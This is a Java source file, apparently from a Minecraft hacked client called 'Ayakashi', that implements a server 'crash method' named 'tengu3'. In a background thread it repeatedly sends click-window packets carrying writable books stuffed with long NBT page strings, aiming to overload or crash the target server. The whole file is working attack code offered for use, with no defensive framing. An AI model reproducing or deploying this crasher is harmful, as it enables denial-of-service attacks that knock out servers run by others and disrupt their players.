package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C0EPacketClickWindow;

@CrashInfo(
        name = "tengu3"
)
public class CrashTengu3 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Tengu method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            try {
                for (int f = 0; f < packets; f++) {
                    NBTTagCompound comp = new NBTTagCompound();
                    NBTTagList list = new NBTTagList();
                    for (int i = 0; i < 5; i++)
                        list.appendTag(new NBTTagString("17283128931273891237198237128931298371829371982378213"));
                    comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                    comp.setString("title", "Ayakashi");
                    comp.setByte("resolved", (byte) 1);
                    comp.setTag("pages", list);
                    ItemStack stack = new ItemStack(Items.writable_book);
                    stack.setTagCompound(comp);
                    PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                    buffer.writeItemStackToBuffer(stack);
                    Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
                    Thread.sleep(2000L);
                }
            } catch (InterruptedException ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}

